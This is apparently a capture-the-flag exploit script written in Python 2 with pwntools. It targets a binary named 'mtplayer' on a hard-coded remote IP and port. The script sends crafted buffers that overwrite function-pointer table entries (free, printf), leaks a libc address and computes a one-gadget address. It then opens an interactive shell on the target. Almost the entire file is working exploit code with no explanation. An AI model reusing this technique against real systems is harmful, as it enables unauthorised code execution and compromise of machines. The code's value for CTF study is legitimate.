#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1

#p = process("./mtplayer")
p = remote("192.144.143.151", 5679)

p.recvuntil("human)\n")

p.sendline("1")

temp = "  0|" * 15 + "\n"
data = p.recvuntil(temp)
print data
time.sleep(0.5)

target = 0x60b030 #free
shell = 0x402800
empty = 0x60b300

wait("me")

pay = "kkjjhlhlBABA123" 
payload = pay.ljust(0x1000, "\x00") + p64(0) * 3 + p64(0x3000) + p64(0) * 4 + p32(0) * 4 + p32(1) * 6  + p64(target) + p64(empty) * 2 + p64(target) * 3 + "\n"

p.send(payload)

print p.recv()


p.sendline("2")

p.recv(0x1001)
wait("go")

target = 0x60b028

magic = "kkjjhlhlBABA"

struct = p64(0) * 3 + p64(0) + p32(1) * 9 + p32(0) + p32(0) + p32(0) + p32(0) * 6 + p64(target) + p64(0) * 2 + p64(0x56ce98)


#repeat payload
payload2 = "\x00" * 0x1000 + p64(0) * 3 + p64(0x4000) + p32(0x1000) * 9 + p32(0) * 7 + p32(1) + p32(0x62) + p64(0)*6 

#p.sendline(payload + struct)
#p.sendline(payload2)

#leak .
payload3 = "\x00" * 0x1000 + p64(0) * 3 + p64(0x4000) + p32(0x1000) * 9 + p32(0) * 7 + p32(0) + p32(0x62) + p64(0x60b018)

p.sendline(payload3)
data = p.recvuntil("U: ")
data2= p.recv()

print data2

printf = raw_input("printf? ")
printf = int(printf, 16)
libc = printf - 0x55800
print hex(libc)
one = libc + 0xf1147
inputer = str(int(hex(one)[6:], 16))
print inputer
payload = magic + inputer
print payload 
payload = payload.ljust(0x1000, "\x00")
payload += struct 

p.sendline(payload)

print p.recv()

p.sendline(payload2)

p.interactive()






